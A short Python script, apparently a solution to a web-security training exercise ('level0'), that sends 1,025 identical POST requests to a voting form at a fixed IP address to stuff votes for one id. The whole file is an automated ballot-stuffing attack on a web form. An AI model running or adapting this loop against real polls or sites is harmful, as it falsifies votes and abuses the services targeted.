#!/usr/bin/python3
import requests

url = "http://158.69.76.135/level0.php"
data = {'id': 2525, 'holdthedoor': 'submit'}
print("Connecting", end='')
for i in range(1025):
    print(".", end='')
    requests.post(url, data)
print("Success.\nVote compled.")
